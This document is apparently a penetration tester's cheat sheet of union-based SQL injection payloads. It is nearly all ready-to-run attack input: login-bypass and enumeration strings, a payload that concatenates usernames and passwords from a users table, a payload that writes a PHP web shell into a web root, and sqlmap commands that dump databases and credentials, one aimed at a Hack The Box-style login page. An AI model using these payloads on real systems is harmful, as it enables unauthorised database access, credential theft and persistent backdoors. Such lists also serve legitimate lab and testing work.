## [+] Union Based SQL Injection

' or 1=1#

1' ORDER BY 10#

1' UNION SELECT version(),2#

1' UNION SELECT version(),database()#

1' UNION SELECT version(),user()#

1' UNION ALL SELECT table_name,2 from information_schema.tables#

1' UNION ALL SELECT column_name,2 from information_schema.columns where table_name = "users"#

1' UNION ALL SELECT concat(user,char(58),password),2 from users#

```sh
q=test&lang=en' UNION SELECT version(),2,3,4,"<?php echo shell_exec($_GET['cmd'});?>",6 INTO OUTFILE "c:/xampp/htdocs/backdoor2.php"#
```


sqlmap --url="<url>" -p username --user-agent=SQLMAP --threads=10 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs

```sh
python2 ./sqlmap.py -r login.req --batch --level 5 --risk 3 -p username,password
```

```sh
sqlmap -r header.req -p <parameter> --level 4 --risk 3 --batch
```

Fetch on string.

```sh
python2 ./sqlmap.py -r login.req --batch --level 5 --risk 3 --string "Wrong identification" --dbms mysql -p username,passsword 
python2 ./sqlmap.py -r login.req --batch --level 5 --risk 3 --string "Wrong identification" --dbms mysql -p username,passsword --dump

python2 ./sqlmap.py -r login.req --batch --level 5 --risk 3 -p email --force-ssl --dump

python2 sqlmap.py -u "https://admin-portal.europacorp.htb/login.php" --data "email=admin@europacorp.htb&password=" --risk 3 --level 5 --dbms "MYSQL" --dump
```

